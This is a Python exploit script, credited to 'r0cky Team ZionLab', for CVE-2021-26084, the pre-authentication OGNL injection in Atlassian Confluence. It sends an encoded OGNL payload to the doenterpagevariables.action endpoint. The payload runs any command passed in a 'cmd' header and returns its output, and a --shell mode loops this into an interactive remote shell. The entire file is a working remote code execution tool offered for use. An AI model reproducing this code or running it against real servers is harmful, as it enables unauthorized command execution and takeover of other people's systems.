#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
@Author: r0cky
@Time: 2021/9/1-15:10
"""
import argparse
import subprocess
import sys
from urllib.parse import urlparse, urljoin

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def banner():
    print("""
===========================================================================
   _____             __ _                             _____   _____ ______ 
  / ____|           / _| |                           |  __ \ / ____|  ____|
 | |     ___  _ __ | |_| |_   _  ___ _ __   ___ ___  | |__) | |    | |__   
 | |    / _ \| '_ \|  _| | | | |/ _ \ '_ \ / __/ _ \ |  _  /| |    |  __|  
 | |___| (_) | | | | | | | |_| |  __/ | | | (_|  __/ | | \ \| |____| |____ 
  \_____\___/|_| |_|_| |_|\__,_|\___|_| |_|\___\___| |_|  \_\\_____|______|
                                                                           
   CVE-2021-26084                          Powered by r0cky Team ZionLab
===========================================================================
    """)

def exp(url, cmd):
    data = "queryString=\\u0027%2b#{\\u0022\\u0022[\\u0022class\\u0022].forName(\\u0022javax.script.ScriptEngineManager\\u0022).newInstance().getEngineByName(\\u0022js\\u0022).eval(\\u0022var c=com.atlassian.core.filters.ServletContextThreadLocal.getRequest().getHeader(\\u0027cmd\\u0027);var x=java.lang.Runtime.getRuntime().exec(c);var out=com.atlassian.core.filters.ServletContextThreadLocal.getResponse().getOutputStream();org.apache.commons.io.IOUtils.copy(x.getInputStream(),out);out.flush();\\u0022)}%2b\\u0027"

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "cmd": cmd
    }

    print("[<<] %s" % cmd)
    req = requests.post(url, data=data, headers=headers, verify=False)
    print(req.text)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="CVE-2021-26084 - Confluence Pre-Auth RCE OGNL injection")
    parser.add_argument('--url', '-u', required=True, type=str, help='Target Url')
    parser.add_argument('--cmd', '-c', type=str, default="whoami", help='Command')
    parser.add_argument('--shell', action="store_true", help='Get shell')
    args = parser.parse_args()

    url = urljoin(args.url, "/pages/doenterpagevariables.action")

    if not args.shell:
        exp(url, args.cmd)
    else:
        while (1):
            command = input("r0cky@shell$ ")
            if command == 'exit' or command == 'quit':
                break
            else:
                exp(url, command)